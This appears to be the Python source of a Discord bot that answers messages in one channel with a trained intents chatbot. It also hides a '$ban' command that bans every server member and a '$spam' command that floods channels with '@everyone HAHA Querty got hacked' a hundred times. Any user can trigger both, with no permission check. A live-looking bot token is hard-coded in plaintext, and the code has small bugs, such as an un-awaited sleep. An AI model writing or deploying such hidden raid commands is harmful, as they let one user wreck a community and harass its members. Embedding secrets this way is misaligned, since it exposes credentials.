import os
import time
from re import I
from time import time
import discord
from neuralintents import GenericAssistant
import asyncio

chatbot = GenericAssistant('intents.json')
chatbot.train_model()
chatbot.save_model('Core')

client = discord.Client()

Token = 'OTI5NDc5OTE5Nzc0MzQzMjcx.Ydn7oQ.0Yvn_4eXCdCKS5OVAbaICnzCPYE'

@client.event
async def on_message(ctx):
    if ctx.author == client.user or ctx.content.startswith('?purge'):
        return
    
    if ctx.content.startswith('$ban'):
      for user in ctx.guild.members:
         try:
             await user.ban()
         except:
             pass

    if ctx.content.startswith('$spam'):
     for I in range(100):
         await ctx.channel.send('@everyone HAHA Querty got hacked')
         asyncio.sleep(0.1)
     return

    if ctx.channel.name == '💬·chat-1':
        response = chatbot.request(ctx.content)
        await ctx.channel.send(response)

client.run(Token)